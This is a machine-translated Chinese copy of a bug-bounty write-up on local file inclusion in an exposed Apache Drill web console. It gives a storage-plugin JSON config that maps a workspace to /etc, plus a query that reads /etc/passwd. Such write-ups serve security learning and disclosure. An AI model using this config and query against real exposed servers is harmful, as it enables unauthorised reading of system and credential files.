<html>
<head>
<title>How we got LFI in apache Drill (Recon like a boss)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">我们如何在阿帕奇演习中得到LFI</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/how-we-got-lfi-in-apache-drill-recon-like-a-boss-6f739a79d87d?source=collection_archive---------0-----------------------#2018-04-23">https://infosecwriteups.com/how-we-got-lfi-in-apache-drill-recon-like-a-boss-6f739a79d87d?source=collection_archive---------0-----------------------#2018-04-23</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="aaa2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">大家好，</p><p id="8490" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如我在上一篇博客中承诺的，今天我将写一些关于LFI的事情。特别感谢独一无二的乔伯特。</p><p id="3e19" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">几个月前，我在<a class="ae kl" href="https://hackerone.com" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir">黑客</strong> </a>平台收到了私人邀请。如你所知，侦查在入侵一个程序时起着重要的作用。Recon并不总是意味着找到属于一个公司的子域名，它也可能涉及到发现一个公司是如何设置其属性和他们正在使用什么资源。</p><h1 id="3461" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">什么是LFI？</h1><pre class="lk ll lm ln gt lo lp lq lr aw ls bi"><span id="421a" class="lt kn iq lp b gy lu lv l lw lx">Local File inclusion (LFI), or simply File Inclusion, refers to an inclusion attack through which an attacker can trick the web application in including files on the web server by exploiting functionality that dynamically includes local files or scripts. The consequence of a successful LFI attack includes Directory Traversal and Information Disclosure as well as Remote Code Execution.</span><span id="8827" class="lt kn iq lp b gy ly lv l lw lx">Typically, Local File Inclusion (LFI) occurs, when an application gets the path to the file that has to be included as an input without treating it as untrusted input. This would allow a local file to be supplied to the include statement.</span></pre><p id="ccc3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在shodan和crt.sh中查找该域名后，我找到了一个，http://ec2-xx-xx-XXX-XXX . us-west-2 . compute . Amazon AWS . com:8047，并开始在那里挖掘，最初几个小时没有成功。后来我发现了像查询、存储标签这样的标签，所以我很快去了他们的文档，阅读所有的东西，以及它如何在<a class="ae kl" href="https://drill.apache.org/docs/" rel="noopener ugc nofollow" target="_blank">https://drill.apache.org/docs/</a>工作。</p><h1 id="23b4" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">关于查询的几件事:</h1><pre class="lk ll lm ln gt lo lp lq lr aw ls bi"><span id="6126" class="lt kn iq lp b gy lu lv l lw lx">The query specifies the data source location and includes data casting.Specifying the Data Source Location ¶The optional <a class="ae kl" href="https://drill.apache.org/docs/use" rel="noopener ugc nofollow" target="_blank">USE statement</a> runs subsequent queries against a particular <a class="ae kl" href="https://drill.apache.org/docs/connect-a-data-source-introduction/" rel="noopener ugc nofollow" target="_blank">storage plugin</a>. The USE statement typically saves typing some of the storage plugin information in the FROM statement. If you omit the USE statement, specify a storage plugin, such as dfs, and optionally a workspace, such as default, and a path to the data source using dot notation and back ticks. </span><span id="e69c" class="lt kn iq lp b gy ly lv l lw lx">For example:<br/>d<!-- -->fs.`default`.`/Users/drill-user/apache-drill-1.1.0/log/sqlline_queries.json<!-- -->`;</span></pre><p id="ee93" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在理解了一些文件后，我向伟大的黑客Jobert Abma(hacker one的联合创始人)寻求帮助，他告诉我们可以试着得到LFI。</p><p id="445f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">等一会儿，听听音乐。</p><figure class="lk ll lm ln gt lz"><div class="bz fp l di"><div class="ma mb l"/></div></figure><p id="1e13" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">几分钟后，jobert拿出了下面的json文件，这是他写的dfs存储方法:</p><pre class="lk ll lm ln gt lo lp lq lr aw ls bi"><span id="0f4f" class="lt kn iq lp b gy lu lv l lw lx">{   "type": "file",  <br/> "enabled": true, <br/>  "connection": "file:///", <br/>  "config": null,   <br/>"workspaces": {     "etc":<br/> {       "location": "/etc",<br/>       "writable": false,<br/>       "defaultInputFormat": "tsv"     } <br/>  },   "formats": {  <br/>   "tsv": {     <br/>  "type": "text",     <br/>  "extensions": [ "tsv"], <br/>   "delimiter": "\t"   <br/>  }   <br/>}<br/>}</span></pre><p id="7a77" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从查询选项卡中调用它</p><p id="85d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">比如:</p><pre class="lk ll lm ln gt lo lp lq lr aw ls bi"><span id="6dfd" class="lt kn iq lp b gy lu lv l lw lx">select * from dfs.etc.`passwd`</span></pre><p id="fd74" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">哇哦！我们只有:</p><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div role="button" tabindex="0" class="md me di mf bf mg"><div class="gh gi mc"><img src="../Images/6ac9ed57e2f4d079cbaa3ca64239addc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9oyNmKuuGC1V7e-onZF2gg.png"/></div></div></figure><p id="d009" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以，是时候狂欢了！</p><figure class="lk ll lm ln gt lz"><div class="bz fp l di"><div class="mj mb l"/></div></figure><p id="4e67" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我们尝试使用多个json文件作为dfs存储方法，并获得了成功。</p><figure class="lk ll lm ln gt lz"><div class="bz fp l di"><div class="mk mb l"/></div><figcaption class="ml mm gj gh gi mn mo bd b be z dk translated">呜哇呜！</figcaption></figure><p id="6cc6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我一直相信分享就是关爱，我一直在向多位安全研究人员学习。希望你喜欢这个发现。更多的人来了。敬请关注。DM在twitter ( <a class="mp mq ep" href="https://medium.com/u/7678f2f901d4?source=post_page-----6f739a79d87d--------------------------------" rel="noopener" target="_blank"> Gujjuboy10x00 </a>，hackerone.com/gujjuboy10x00)上对任何问题都是开放的。</p></div></div>    
</body>
</html>